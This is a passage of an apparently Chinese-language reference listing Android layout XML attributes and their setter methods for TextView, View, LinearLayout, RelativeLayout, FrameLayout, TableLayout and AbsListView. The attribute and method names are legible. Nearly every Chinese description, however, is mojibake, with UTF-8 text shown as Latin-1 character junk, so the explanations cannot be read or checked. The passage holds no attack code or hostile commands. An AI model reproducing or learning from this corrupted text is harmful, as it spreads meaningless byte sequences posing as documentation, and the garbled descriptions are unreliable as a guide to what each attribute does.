æ–‡æœ¬çš„å­—å½¢ä½“ç³»ã€‚ android:freezesText setFreezesText(boolean) å±æ€§è¯´æ˜: è®¾ç½®ä¿å­˜æ–‡æœ¬çš„å†…å®¹ä»¥åŠå…‰æ ‡çš„ä½ç½®ã€‚ android:gravity setGravity(int) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬ä½ç½®ï¼Œå¦‚è®¾ç½®æˆâ€œcenterâ€ï¼Œæ–‡æœ¬å°†å±…ä¸­æ˜¾ç¤ºã€‚ android:height setHeight(int) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬åŒºåŸŸçš„é«˜åº¦ï¼Œæ”¯æŒåº¦é‡å•ä½ï¼špx(åƒç´ )/dp/sp/in/mm(æ¯«ç±³) android:hint setHint(int) å±æ€§è¯´æ˜: Textä¸ºç©ºæ—¶æ˜¾ç¤ºçš„æ–‡å­—æç¤ºä¿¡æ¯ï¼Œå¯é€šè¿‡textColorHintè®¾ç½®æç¤ºä¿¡æ¯çš„é¢œè‰²ã€‚ android:imeActionId setImeActionLabel(CharSequence,int) å±æ€§è¯´æ˜: è®¾ç½®IMEåŠ¨ä½œIDã€‚ android:imeActionLabel setImeActionLabel(CharSequence,int) å±æ€§è¯´æ˜: è®¾ç½®IMEåŠ¨ä½œæ ‡ç­¾ã€‚åœ¨EditViewå†åšè¯´æ˜ã€‚ android:imeOptions setImeOptions(int) å±æ€§è¯´æ˜: é™„åŠ åŠŸèƒ½ï¼Œè®¾ç½®å³ä¸‹è§’IMEåŠ¨ä½œä¸ç¼–è¾‘æ¡†ç›¸å…³çš„åŠ¨ä½œï¼Œå¦‚actionDoneå³ä¸‹è§’å°†æ˜¾ç¤ºä¸€ä¸ªâ€œå®Œæˆâ€ï¼Œè€Œä¸è®¾ç½®é»˜è®¤æ˜¯ä¸€ä¸ªå›è½¦ç¬¦å·ã€‚ android:includeFontPadding setIncludeFontPadding(boolean) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬æ˜¯å¦åŒ…å«é¡¶éƒ¨å’Œåº•éƒ¨é¢å¤–ç©ºç™½ï¼Œé»˜è®¤ä¸ºtrueã€‚ android:inputMethod setKeyListener(KeyListener) å±æ€§è¯´æ˜: ä¸ºæ–‡æœ¬æŒ‡å®šè¾“å…¥æ³•ï¼Œéœ€è¦å®Œå…¨é™å®šåï¼ˆå®Œæ•´çš„åŒ…åï¼‰ã€‚ä¾‹å¦‚ï¼šcom.google.android.inputmethod.pinyinï¼Œä½†æ˜¯è¿™é‡ŒæŠ¥é”™æ‰¾ä¸åˆ°ã€‚ android:inputType setRawInputType(int) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬çš„ç±»å‹ï¼Œç”¨äºå¸®åŠ©è¾“å…¥æ³•æ˜¾ç¤ºåˆé€‚çš„é”®ç›˜ç±»å‹ã€‚åœ¨EditViewä¸­å†è¯¦ç»†è¯´æ˜ï¼Œè¿™é‡Œæ— æ•ˆæœã€‚ android:lineSpacingExtra setLineSpacing(float,float) å±æ€§è¯´æ˜: è®¾ç½®è¡Œé—´è·ã€‚ android:lineSpacingMultiplier setLineSpacing(float,float) å±æ€§è¯´æ˜: è®¾ç½®è¡Œé—´è·çš„å€æ•°ã€‚å¦‚â€1.2â€ android:lines setLines(int) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬çš„è¡Œæ•°ï¼Œè®¾ç½®ä¸¤è¡Œå°±æ˜¾ç¤ºä¸¤è¡Œï¼Œå³ä½¿ç¬¬äºŒè¡Œæ²¡æœ‰æ•°æ®ã€‚ android:linksClickable setLinksClickable(boolean) å±æ€§è¯´æ˜: è®¾ç½®é“¾æ¥æ˜¯å¦ç‚¹å‡»è¿æ¥ï¼Œå³ä½¿è®¾ç½®äº†autoLinkã€‚ android:marqueeRepeatLimit setMarqueeRepeatLimit(int) å±æ€§è¯´æ˜: åœ¨ellipsizeæŒ‡å®šmarqueeçš„æƒ…å†µä¸‹ï¼Œè®¾ç½®é‡å¤æ»šåŠ¨çš„æ¬¡æ•°ï¼Œå½“è®¾ç½®ä¸ºmarquee_foreveræ—¶è¡¨ç¤ºæ— é™æ¬¡ã€‚ android:maxEms setMaxEms(int) å±æ€§è¯´æ˜: è®¾ç½®TextViewçš„å®½åº¦ä¸ºæœ€é•¿ä¸ºNä¸ªå­—ç¬¦çš„å®½åº¦ã€‚ä¸emsåŒæ—¶ä½¿ç”¨æ—¶è¦†ç›–emsé€‰é¡¹ã€‚ android:maxHeight setMaxHeight(int) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬åŒºåŸŸçš„æœ€å¤§é«˜åº¦ android:maxLength setFilters(InputFilter) å±æ€§è¯´æ˜: é™åˆ¶æ˜¾ç¤ºçš„æ–‡æœ¬é•¿åº¦ï¼Œè¶…å‡ºéƒ¨åˆ†ä¸æ˜¾ç¤ºã€‚ android:maxLines setMaxLines(int) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬çš„æœ€å¤§æ˜¾ç¤ºè¡Œæ•°ï¼Œä¸widthæˆ–è€…layout_widthç»“åˆä½¿ç”¨ï¼Œè¶…å‡ºéƒ¨åˆ†è‡ªåŠ¨æ¢è¡Œï¼Œè¶…å‡ºè¡Œæ•°å°†ä¸æ˜¾ç¤ºã€‚ android:maxWidth setMaxWidth(int) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬åŒºåŸŸçš„æœ€å¤§å®½åº¦ android:minEms setMinEms(int) å±æ€§è¯´æ˜: è®¾ç½®TextViewçš„å®½åº¦ä¸ºæœ€çŸ­ä¸ºNä¸ªå­—ç¬¦çš„å®½åº¦ã€‚ä¸emsåŒæ—¶ä½¿ç”¨æ—¶è¦†ç›–emsé€‰é¡¹ã€‚ android:minHeight setMinHeight(int) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬åŒºåŸŸçš„æœ€å°é«˜åº¦ android:minLines setMinLines(int) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬çš„æœ€å°è¡Œæ•°ï¼Œä¸linesç±»ä¼¼ã€‚ android:minWidth setMinWidth(int) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬åŒºåŸŸçš„æœ€å°å®½åº¦ android:numeric setKeyListener(KeyListener) å±æ€§è¯´æ˜: å¦‚æœè¢«è®¾ç½®ï¼Œè¯¥TextViewæœ‰ä¸€ä¸ªæ•°å­—è¾“å…¥æ³•ã€‚æ­¤å¤„æ— ç”¨ï¼Œè®¾ç½®åå”¯ä¸€æ•ˆæœæ˜¯TextViewæœ‰ç‚¹å‡»æ•ˆæœï¼Œæ­¤å±æ€§åœ¨EdtiViewå°†è¯¦ç»†è¯´æ˜ã€‚ android:password setTransformationMethod(TransformationMethod) å±æ€§è¯´æ˜: ä»¥å°ç‚¹â€.â€æ˜¾ç¤ºæ–‡æœ¬ android:phoneNumber setKeyListener(KeyListener) å±æ€§è¯´æ˜: è®¾ç½®ä¸ºç”µè¯å·ç çš„è¾“å…¥æ–¹å¼ã€‚ android:privateImeOptions setPrivateImeOptions(String) å±æ€§è¯´æ˜: è®¾ç½®è¾“å…¥æ³•é€‰é¡¹ï¼Œåœ¨EditTextä¸­æ‰æœ‰ä½œç”¨ã€‚ android:scrollHorizontally setHorizontallyScrolling(boolean) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬è¶…å‡ºTextViewçš„å®½åº¦çš„æƒ…å†µä¸‹ï¼Œæ˜¯å¦å‡ºç°æ¨ªæ‹‰æ¡ã€‚ android:selectAllOnFocus setSelectAllOnFocus(boolean) å±æ€§è¯´æ˜: å¦‚æœæ–‡æœ¬æ˜¯å¯é€‰æ‹©çš„ï¼Œè®©ä»–è·å–ç„¦ç‚¹è€Œä¸æ˜¯å°†å…‰æ ‡ç§»åŠ¨ä¸ºæ–‡æœ¬çš„å¼€å§‹ä½ç½®æˆ–è€…æœ«å°¾ä½ç½®ã€‚TextViewä¸­è®¾ç½®åæ— æ•ˆæœã€‚ android:shadowColor setShadowLayer(float,float,float,int) å±æ€§è¯´æ˜: æŒ‡å®šæ–‡æœ¬é˜´å½±çš„é¢œè‰²ï¼Œéœ€è¦ä¸shadowRadiusä¸€èµ·ä½¿ç”¨ã€‚ android:shadowDx setShadowLayer(float,float,float,int) å±æ€§è¯´æ˜: è®¾ç½®é˜´å½±æ¨ªå‘åæ ‡å¼€å§‹ä½ç½®ã€‚ android:shadowDy setShadowLayer(float,float,float,int) å±æ€§è¯´æ˜: è®¾ç½®é˜´å½±çºµå‘åæ ‡å¼€å§‹ä½ç½®ã€‚ android:shadowRadius setShadowLayer(float,float,float,int) å±æ€§è¯´æ˜: è®¾ç½®é˜´å½±çš„åŠå¾„ã€‚è®¾ç½®ä¸º0.1å°±å˜æˆå­—ä½“çš„é¢œè‰²äº†ï¼Œä¸€èˆ¬è®¾ç½®ä¸º3.0çš„æ•ˆæœæ¯”è¾ƒå¥½ã€‚ android:singleLine setTransformationMethod(TransformationMethod) å±æ€§è¯´æ˜: è®¾ç½®å•è¡Œæ˜¾ç¤ºã€‚å¦‚æœå’Œlayout_widthä¸€èµ·ä½¿ç”¨ï¼Œå½“æ–‡æœ¬ä¸èƒ½å…¨éƒ¨æ˜¾ç¤ºæ—¶ï¼Œåé¢ç”¨â€œâ€¦â€æ¥è¡¨ç¤ºã€‚å¦‚android:text=&quot;test_ singleLine &quot; android:singleLine=&quot;true&quot; android:layout_width=&quot;20dp&quot;å°†åªæ˜¾ç¤ºâ€œtâ€¦â€ã€‚å¦‚æœä¸è®¾ç½®singleLineæˆ–è€…è®¾ç½®ä¸ºfalseï¼Œæ–‡æœ¬å°†è‡ªåŠ¨æ¢è¡Œ android:text setText(CharSequence,TextView.BufferType) å±æ€§è¯´æ˜: è®¾ç½®æ˜¾ç¤ºæ–‡æœ¬. android:textAllCaps setAllCaps(boolean) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬å…¨ä¸ºå¤§å†™ã€‚å€¼ä¸º&quot;true&quot;æˆ–&quot;false&quot;ã€‚ android:textAppearance å±æ€§è¯´æ˜: è®¾ç½®æ–‡å­—å¤–è§‚ã€‚å¦‚â€œ?android:attr/textAppearanceLargeInverse android:textColor setTextColor(int) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬é¢œè‰² android:textColorHighlight setHighlightColor(int) å±æ€§è¯´æ˜: è¢«é€‰ä¸­æ–‡å­—çš„åº•è‰²ï¼Œé»˜è®¤ä¸ºè“è‰² android:textColorHint setHintTextColor(int) å±æ€§è¯´æ˜: è®¾ç½®æç¤ºä¿¡æ¯æ–‡å­—çš„é¢œè‰²ï¼Œé»˜è®¤ä¸ºç°è‰²ã€‚ä¸hintä¸€èµ·ä½¿ç”¨ã€‚ android:textColorLink setLinkTextColor(int) å±æ€§è¯´æ˜: æ–‡å­—é“¾æ¥çš„é¢œè‰². android:textIsSelectable isTextSelectable() å±æ€§è¯´æ˜: è®¾ç½®éç¼–è¾‘æ–‡æœ¬å¯å¦è¢«é€‰æ‹©ã€‚å€¼ä¸º&quot;true&quot;æˆ–&quot;false&quot;ã€‚ android:textScaleX setTextScaleX(float) å±æ€§è¯´æ˜: è®¾ç½®æ–‡å­—ä¹‹é—´é—´éš”ï¼Œé»˜è®¤ä¸º1.0fã€‚ android:textSize setTextSize(int,float) å±æ€§è¯´æ˜: è®¾ç½®æ–‡å­—å¤§å°ï¼Œæ¨èåº¦é‡å•ä½â€spâ€ï¼Œå¦‚â€15spâ€ android:textStyle setTypeface(Typeface) å±æ€§è¯´æ˜: è®¾ç½®å­—å½¢[bold(ç²—ä½“) 0, italic(æ–œä½“) 1, bolditalic(åˆç²—åˆæ–œ) 2] å¯ä»¥è®¾ç½®ä¸€ä¸ªæˆ–å¤šä¸ªï¼Œç”¨â€œ|â€éš”å¼€ android:typeface setTypeface(Typeface) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬å­—ä½“ï¼Œå¿…é¡»æ˜¯ä»¥ä¸‹å¸¸é‡å€¼ä¹‹ä¸€ï¼šnormal 0, sans 1, serif 2, monospace(ç­‰å®½å­—ä½“) 3] android:width setWidth(int) å±æ€§è¯´æ˜: è®¾ç½®æ–‡æœ¬åŒºåŸŸçš„å®½åº¦ï¼Œæ”¯æŒåº¦é‡å•ä½ï¼špx(åƒç´ )/dp/sp/in/mm(æ¯«ç±³)ã€‚ android:fadingEdgeLength è®¾ç½®æ·¡å…¥æ·¡å‡ºè¾¹ç¼˜çš„é•¿åº¦ï¼Œå¯ä»¥æ¥å—å¤§å°å€¼çš„å•ä½æ˜¯ï¼špxã€dpã€spã€inã€mmï¼Œä¹Ÿå¯ä»¥å‚è€ƒå¤§å°å€¼èµ„æº android:fitsSystemWindows æ˜¯å¦é€‚åˆç³»ç»Ÿçª—ä½“ï¼Œå–å€¼ä¸ºtrueæˆ–falseã€‚è¯¥å±æ€§åªå¯¹ä¸æ˜¯å­ç»„ä»¶çš„ç»„ä»¶æœ‰æ•ˆ android:focusable æ˜¯å¦å¯ä»¥è·å–ç„¦ç‚¹ï¼Œå–å€¼trueæˆ–false android:focusableInTouchMode æ˜¯å¦å¯ä»¥åœ¨è§¦æ‘¸æ¨¡å¼ä¸‹è·å–ç„¦ç‚¹ï¼Œtrueæˆ–false android:hapticFeedbackEnabled æ˜¯å¦å…è®¸è§¦æ‘¸åé¦ˆæ•ˆæœï¼Œtrueæˆ–false android:id æä¾›è¯¥ç»„ä»¶çš„æ ‡è¯†åï¼Œå¯ä»¥å€ŸåŠ©Activityæˆ–Viewå®ä¾‹çš„findViewByIdæ–¹æ³•é€šè¿‡idè·å–å¯¹åº”çš„ç»„ä»¶å®ä¾‹å¯¹è±¡ï¼Œå…¶å±æ€§å€¼çš„å½¢å¼ä¸ºï¼šandroid:id=â€@+id/idâ€ android:isScrollContainer è®¾ç½®è¯¥ç»„ä»¶æ˜¯å¦è®¾ç½®ä¸ºæ»šåŠ¨æ¡å®¹å™¨ï¼Œtrueæˆ–false android:keepScreenOn æ§åˆ¶è¯¥ç»„ä»¶åœ¨æ˜¾ç¤ºçš„æ—¶å€™ä¿æŒåœ¨å±å¹•æ˜¾ç¤ºï¼Œtrueæˆ–false android:longClickable æ˜¯å¦å“åº”é•¿æ—¶é—´ç‚¹å‡»äº‹ä»¶ï¼Œtrueæˆ–false android:minHeight ç»„ä»¶çš„æœ€å°é«˜åº¦ï¼Œå–å€¼åŒandroid:fadingEdgeLength android:minWidth ç»„ä»¶çš„æœ€å°å®½åº¦ï¼Œå–å€¼åŒandroid:fadingEdgeLength android:nextFocusDown è®¾ç½®ä¸‹ä¸€ä¸ªå‘ä¸‹è·å–ç„¦ç‚¹çš„ç»„ä»¶ï¼Œå–å€¼ä¸ºid android:nextFocusLeft è®¾ç½®ä¸‹ä¸€ä¸ªå‘å·¦è·å–ç„¦ç‚¹çš„ç»„ä»¶ï¼Œå–å€¼ä¸ºid android:nextFocusRight è®¾ç½®ä¸‹ä¸€ä¸ªå‘å³è·å–ç„¦ç‚¹çš„ç»„ä»¶ï¼Œå–å€¼ä¸ºid android:nextFocusUp è®¾ç½®ä¸‹ä¸€ä¸ªå‘ä¸Šè·å–ç„¦ç‚¹çš„ç»„ä»¶ï¼Œå–å€¼ä¸ºid android:padding è®¾ç½®ä¸Šã€ä¸‹ã€å·¦ã€å³4ä¸ªè¾¹ç¼˜çš„å¡«å……è·ç¦»ï¼Œå¿…é¡»æ˜¯ä¸€ä¸ªå¤§å°å€¼ï¼Œå–å€¼åŒandroid:fadingEdgeLength android:paddingBottom è®¾ç½®ä¸‹ç«¯è¾¹ç¼˜çš„å¡«å……è·ç¦»ï¼Œå–å€¼åŒandroid:padding android:paddingLeft è®¾ç½®å·¦ç«¯è¾¹ç¼˜çš„å¡«å……è·ç¦»ï¼Œå–å€¼åŒandroid:padding android:paddingRight è®¾ç½®å³ç«¯è¾¹ç¼˜çš„å¡«å……è·ç¦»ï¼Œå–å€¼åŒandroid:padding android:paddingTop è®¾ç½®ä¸Šç«¯è¾¹ç¼˜çš„å¡«å……è·ç¦»ï¼Œå–å€¼åŒandroid:padding android:saveEnabled æ˜¯å¦å…è®¸ä¿å­˜çŠ¶æ€ï¼Œå–å€¼ä¸ºtrueæˆ–false android:scrollX è®¾ç½®å‚ç›´æ»šåŠ¨æ¡çš„ä½ç§»é‡ï¼Œå¿…é¡»æ˜¯ä¸€ä¸ªå¤§å°å€¼ï¼Œå–å€¼åŒandroid:padding android:scrollY è®¾ç½®æ°´å¹³æ»šåŠ¨æ¡çš„ä½ç§»é‡ï¼Œå¿…é¡»æ˜¯ä¸€ä¸ªå¤§å°å€¼ï¼Œå–å€¼åŒandroid:padding android:scrollbarAlwaysDrawHorizontalTrack æ˜¯å¦æ€»æ˜¯è®¾ç½®æ°´å¹³æ»šåŠ¨æ¡æ»‘å—ï¼Œtrueæˆ–false android:scrollbarAlwaysDrawVerticalTrack æ˜¯å¦æ€»æ˜¯è®¾ç½®å‚ç›´æ»šåŠ¨æ¡æ»‘å—ï¼Œtrueæˆ–false android:scrollbarSize è®¾ç½®å‚ç›´æ»šåŠ¨æ¡çš„å®½åº¦å’Œæ°´å¹³æ»šåŠ¨æ¡çš„é•¿åº¦ï¼Œå¿…é¡»æ˜¯ä¸€ä¸ªå¤§å°å€¼ï¼Œå–å€¼åŒandroid:padding android:scrollbarStyle è®¾ç½®æ»šåŠ¨æ¡çš„æ ·å¼ï¼Œå–å€¼ä¸ºä¸‹åˆ—ä¹‹ä¸€ï¼š insideOverlayåœ¨å¡«å……åŒºåŸŸå†…ï¼Œè¦†ç›–å½¢å¼ insideInsetåœ¨å¡«å……åŒºåŸŸå†…ï¼Œæ’è¿›å½¢å¼ï¼ˆå‡¹è¿›ï¼‰ outsideOverlyåœ¨ç»‘å®šç»„ä»¶è¾¹ç¼˜ï¼Œè¦†ç›–å½¢å¼ outsideInsetåœ¨ç»‘å®šç»„ä»¶è¾¹ç¼˜ï¼Œæ’è¿›å½¢ä¼¼ android:scrollbarThumbHorizontal è®¾ç½®æ°´å¹³æ»šåŠ¨æ¡æŒ‰é’®çš„ç»˜åˆ¶èµ„æºï¼Œå¿…é¡»å¼•ç”¨å¯ç»˜åˆ¶èµ„æº android:scrollbarThumbVertical è®¾ç½®å‚ç›´æ»šåŠ¨æ¡æŒ‰é’®çš„ç»˜åˆ¶èµ„æºï¼Œå¿…é¡»å¼•ç”¨å¯ç»˜åˆ¶èµ„æº android:scrollbarTrackHorizontal è®¾ç½®æ°´å¹³æ»šåŠ¨æ¡è½¨é“çš„ç»˜åˆ¶èµ„æºï¼Œå¿…é¡»å¼•ç”¨å¯ç»˜åˆ¶èµ„æº android:scrollbarTrackVertical è®¾ç½®æ°´å¹³æ»šåŠ¨æ¡è½¨é“çš„ç»˜åˆ¶èµ„æºï¼Œå¿…é¡»å¼•ç”¨å¯ç»˜åˆ¶èµ„æº android:scrollbars è®¾ç½®æ»šåŠ¨æ˜¾ç¤ºï¼Œå¯ä»¥ä¸ºä¸€ä¸‹ä¸€ä¸ªæˆ–å¤šä¸ªå€¼ï¼š noneä¸æ˜¾ç¤ºæ»šåŠ¨æ¡ horizontalåªæ˜¾ç¤ºæ°´å¹³æ»šåŠ¨æ¡ verticalåªæ˜¾ç¤ºå‚ç›´æ»šåŠ¨æ¡ android:soundEffectsEnabled æ˜¯å¦å…è®¸éŸ³æ•ˆï¼Œå–å€¼ä¸ºtrueæˆ–false android:tag è®¾ç½®æ ‡è®°å†…å®¹ï¼Œå¯ä»¥é€šè¿‡Viewç±»å®ä¾‹çš„getTagæ–¹æ³•è·å–è¯¥ç»„ä»¶çš„æ ‡è®°å†…å®¹ï¼Œæˆ–è€…ä½¿ç”¨findViewByTagé€šè¿‡æ ‡è®°æ¥æŸ¥æ‰¾ç›¸åº”çš„å­ç»„ä»¶ android:visibility è®¾ç½®åˆå§‹åŒ–å¯è§çŠ¶æ€ï¼Œå–å€¼ä¸ºä»¥ä¸‹ä¹‹ä¸€ï¼š visibleå¯è§ï¼ˆé»˜è®¤å€¼ï¼‰ invisibleä¸å¯è§ï¼ˆå…¶æ‰€å ç©ºé—´å°†ç•™å‡ºï¼‰ goneå®Œå…¨ä¸å¯è§ï¼ˆå…¶æ‰€å ç©ºé—´éƒ½ä¸ä¼šç•™å‡ºï¼‰ çº¿æ€§å¸ƒå±€LinearLayoutç»„ä»¶å±æ€§åˆ—è¡¨ å±æ€§è¯´æ˜ android:baselineAligned åŸºçº¿å¯¹é½ android:baselineAlignedChildIndex ä»¥æŒ‡å®šå­ç»„ä»¶ä½œä¸ºåŸºçº¿å¯¹é½ android:gravity æŒ‡å®šè¯¥ç‰©ä½“æ”¾å…¥å…¶å®¹å™¨çš„é‡å¿ƒä½ç½®ï¼Œå–å€¼ä¸ºä¸‹åˆ—ä¹‹ä¸€ï¼š topä¸Šæ–¹ï¼Œç‰©ä½“å¤§å°ä¸å˜ bottomä¸‹æ–¹ï¼Œç‰©ä½“å¤§å°ä¸å˜ leftå·¦æ–¹ï¼Œç‰©ä½“å¤§å°ä¸å˜ rightå³æ–¹ï¼Œç‰©ä½“å¤§å°ä¸å˜ center_verticalå‚ç›´æ–¹å‘çš„ä¸­é—´ï¼Œç‰©ä½“å¤§å°ä¸å˜ fill_verticalå¡«æ»¡å‚ç›´æ–¹å‘ï¼Œè‡ªåŠ¨è¿›è¡Œå¤§å°è°ƒæ•´ center_horizontalæ°´å¹³æ–¹å‘çš„ä¸­é—´ï¼Œå¤§å°ä¸å˜ fill_horizontalå¡«æ»¡æ°´å¹³æ–¹å‘ï¼Œè‡ªåŠ¨è¿›è¡Œå¤§å°è°ƒæ•´ centerå±…ä¸­ï¼ˆæ—¢æ˜¯æ°´å¹³ä¹Ÿæ˜¯å‚ç›´æ–¹å‘çš„ä¸­é—´ï¼‰ fillå¡«æ»¡æ•´ä¸ªå®¹å™¨ clip_vertical clip_horizontal android:orientation å¸ƒå±€æ–¹å‘ï¼Œå–å€¼ä¸ºä¸‹åˆ—ä¹‹ä¸€ï¼š horizontalæ°´å¹³çš„ verticalå‚ç›´çš„ï¼ˆé»˜è®¤å€¼ï¼‰ android:weightSum ç»„ä»¶çš„æ¯”é‡å’Œ LinearLayout_Layoutå±æ€§è¯´æ˜ android:layout_gravity å½“å‰å­ç»„ä»¶çš„å¿ƒä½ç½® android:layout_height å½“å‰å­ç»„ä»¶çš„é«˜åº¦ android:layout_weight å½“å‰å­ç»„ä»¶çš„ç©ºé—´æ¯”é‡ï¼Œå–å€¼ä¸ºæµ®ç‚¹æ•° android:layout_width å½“å‰å­ç»„ä»¶çš„å®½åº¦ RalativeLayoutå±æ€§è¯´æ˜ android:gravity è®¾ç½®æ·»åŠ ç»„ä»¶çš„é‡å¿ƒ android:ignoreGravity å¿½ç•¥å¸ƒå±€é‡å¿ƒçš„å½±å“ RalativeLayout_Layoutå±æ€§è¯´æ˜ android:layout_above å°†å½“å‰ç»„ä»¶çš„ä¸‹è¾¹ç¼˜æ”¾ç½®äºå‚ç…§ç»„ä»¶ä¹‹ä¸Šï¼Œè¯¥å±æ€§ä¸ºå‚ç…§ç»„ä»¶çš„ID android:layout_alignBaseline å½“å‰ç»„ä»¶ä¸å‚ç…§ç»„ä»¶çš„åŸºçº¿å¯¹é½ï¼Œè¯¥å±æ€§ä¸ºå‚ç…§ç»„ä»¶çš„ID android:layout_alignBottom å½“å‰ç»„ä»¶ä¸å‚ç…§ç»„ä»¶çš„ä¸‹è¾¹ç•Œå¯¹é½ï¼Œè¯¥å±æ€§ä¸ºå‚ç…§ç»„ä»¶çš„ID android:layout_alignLeft å½“å‰ç»„ä»¶ä¸å‚ç…§ç»„ä»¶çš„å·¦è¾¹ç•Œå¯¹é½ï¼Œè¯¥å±æ€§ä¸ºå‚ç…§ç»„ä»¶çš„ID android:layout_alignParenBottom å½“å‰ç»„ä»¶ä¸çˆ¶ç»„ä»¶çš„ä¸‹è¾¹ç•Œå¯¹é½ï¼Œtrueæˆ–false android:layout_alignParentLeft å½“å‰ç»„ä»¶ä¸çˆ¶ç»„ä»¶çš„å·¦è¾¹ç•Œå¯¹é½ï¼Œtrueæˆ–false android:layout_alignParentRight å½“å‰ç»„ä»¶ä¸çˆ¶ç»„ä»¶çš„å³è¾¹ç•Œå¯¹é½ï¼Œtrueæˆ–false android:layout_alignParentTop å½“å‰ç»„ä»¶ä¸çˆ¶ç»„ä»¶çš„ä¸Šè¾¹ç•Œå¯¹é½ï¼Œtrueæˆ–false android:layout_alignRight å½“å‰ç»„ä»¶ä¸å‚ç…§ç»„ä»¶çš„å³è¾¹ç•Œå¯¹é½ï¼Œè¯¥å±æ€§ä¸ºå‚ç…§ç»„ä»¶çš„ID android:layout_alignTop å½“å‰ç»„ä»¶ä¸å‚ç…§ç»„ä»¶çš„ä¸Šè¾¹ç•Œå¯¹é½ï¼Œè¯¥å±æ€§ä¸ºå‚ç…§ç»„ä»¶çš„ID android:layout_alignWithParentIfMissing å¦‚æœå¯¹åº”çš„å…„å¼Ÿå…ƒç´ æ‰¾ä¸åˆ°çš„è¯å°±ä»¥çˆ¶å…ƒç´ åšå‚ç…§ç‰© trueæˆ–false android:layout_below å°†å½“å‰ç»„ä»¶çš„ä¸Šè¾¹ç¼˜æ”¾ç½®äºå‚ç…§ç»„ä»¶ä¹‹ä¸‹ï¼Œè¯¥å±æ€§ä¸ºå‚ç…§ç»„ä»¶çš„ID android:layout_centerHorizontal å½“å‰ç»„ä»¶æ”¾ç½®åˆ°çˆ¶ç»„ä»¶çš„æ°´å¹³å±…ä¸­çš„ä½ç½® android:layout_centerInParent å½“å‰ç»„ä»¶æ”¾ç½®åˆ°çˆ¶ç»„ä»¶çš„é‡å¿ƒä½ç½® android:layout_centerVertical å½“å‰ç»„ä»¶æ”¾ç½®åˆ°çˆ¶ç»„ä»¶å‚ç›´å±…ä¸­çš„ä½ç½® android:layout_toLeftOf å°†å½“å‰ç»„ä»¶çš„å³è¾¹ç¼˜æ”¾ç½®äºå‚ç…§ç»„ä»¶ä¹‹ä¸‹ï¼Œè¯¥å±æ€§ä¸ºå‚ç…§ç»„ä»¶çš„ID android:layout_toRightOf å°†å½“å‰ç»„ä»¶çš„å·¦è¾¹ç¼˜æ”¾ç½®äºå‚ç…§ç»„ä»¶ä¹‹ä¸‹ï¼Œè¯¥å±æ€§ä¸ºå‚ç…§ç»„ä»¶çš„ID AbsoluteLayout_Layoutå±æ€§è¯´æ˜ android:layout_x å½“å‰ç»„ä»¶çš„xåæ ‡ä½ç½®ï¼ˆä»å·¦åˆ°å³æ–¹å‘ï¼‰ android:layout_y å½“å‰ç»„ä»¶çš„yåæ ‡ä½ç½®ï¼ˆä»ä¸Šåˆ°ä¸‹æ–¹å‘ï¼‰ FrameLayoutå±æ€§è¯´æ˜ android:foreground å‰ç½®å›¾ç‰‡ android:foregroundGravity å‰ç½®å›¾ç‰‡é‡å¿ƒ android:measureAllChildren åœ¨åˆ‡æ¢æ˜¾ç¤ºæ—¶æ˜¯å¦ä¾§é‡æ‰€æœ‰å­ç»„ä»¶çš„å¤§å° android:layout_gravity æ·»åŠ ç»„ä»¶çš„é‡å¿ƒ FrameLayout_Layoutå±æ€§è¯´æ˜ android:layout_gravity å½“å‰å­ç»„ä»¶æ‰€æ·»åŠ çš„é‡å¿ƒä½ç½® TableLayoutå±æ€§è¯´æ˜ android:collapseColumns è®¾ç½®å…è®¸æŠ˜å çš„åˆ—ç¼–å·ï¼Œåˆ—ç¼–å·åŸºäº0ï¼Œå±æ€§å€¼å¯ä»¥æ˜¯å•ä¸ªæˆ–å¤šä¸ªåˆ—ç¼–å·ï¼Œç¼–å·ä¸ç¼–å·ç›´æ¥ç”¨é€—å·â€,â€åˆ†éš” android:shrinkColumns è®¾ç½®å…è®¸æ”¶ç¼©çš„åˆ—ç¼–å·ï¼Œåˆ—ç¼–å·åŸºäº0ï¼Œå±æ€§å€¼å¯ä»¥æ˜¯å•ä¸ªæˆ–å¤šä¸ªåˆ—ç¼–å·ï¼Œç¼–å·ä¸ç¼–å·ç›´æ¥ç”¨é€—å·â€,â€åˆ†éš” android:stretchColumns è®¾ç½®å…è®¸ä¼¸å±•çš„åˆ—ç¼–å·ï¼Œåˆ—ç¼–å·åŸºäº0ï¼Œå±æ€§å€¼å¯ä»¥æ˜¯å•ä¸ªæˆ–å¤šä¸ªåˆ—ç¼–å·ï¼Œç¼–å·ä¸ç¼–å·ç›´æ¥ç”¨é€—å·â€,â€åˆ†éš” TableRow_Cellå±æ€§è¯´æ˜ android:layout_column è®¾ç½®è¯¥å•å…ƒæ ¼çš„åˆ—ç¼–å·ï¼ˆåŸºäº0ï¼‰ android:layout_span æŒ‡æ˜è¯¥å•å…ƒæ ¼å¯ä»¥è·¨è¶Šçš„åˆ—æ•° AbsListViewå±æ€§è¯´æ˜ android:cacheColorHint è®¾ç½®ç¼“å†²é¢œè‰² android:drawSelectorOnTop æ˜¯å¦å°†é€‰æ‹©å™¨ç»˜åˆ¶åœ¨å¤‡é€‰æ¡ç›®ä¸Šæ–¹ï¼Œå–å€¼ä¸ºtrueæˆ–false android:fastScrollEnabled å…è®¸å¿«é€Ÿæ»šåŠ¨ android:listSelector æŒ‡ç¤ºé€‰æ‹©å™¨çš„å†…å®¹ android:scrollingCache æ»šåŠ¨æ—¶æ˜¯å¦ä½¿ç”¨ç»˜åˆ¶ç¼“å†²ï¼Œtrueæˆ–false android:smoothScrollbar å¹³æ»‘æ»šåŠ¨æ¡ android:stackFromBottom ä»ä¸‹æ–¹å †å æ¡ç›® android:textFilterEnbled æ˜¯å¦å…è®¸è¿‡æ»¤ 